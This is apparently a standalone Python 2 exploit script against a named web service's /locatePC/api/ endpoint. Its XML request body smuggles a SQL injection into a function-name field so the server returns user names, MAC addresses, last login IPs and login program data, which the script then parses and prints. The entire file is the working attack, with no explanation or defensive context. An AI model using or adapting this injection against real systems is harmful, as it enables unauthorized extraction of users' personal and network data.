#!/usr/bin/python
import httplib
import urllib
import xml.etree.ElementTree
h = httplib.HTTPSConnection('www.ligattsecurity.com')
p = '''<Request 
funcname="uName,mac_address,last_login_ip,program_login from user 
where LENGTH(last_login_ip) > 0;--"></Request>'''
h.request("POST","/locatePC/api/",p,{"ContentType":"application/x-
www-form-urlencoded"})
r = h.getresponse()
data = urllib.unquote_plus(r.read())
for i in xml.etree.ElementTree.fromstring(data).iter():
	if i.tag == "Row":
		print ""
	elif i.tag == "Cell" and i.text != None:
		print i.text

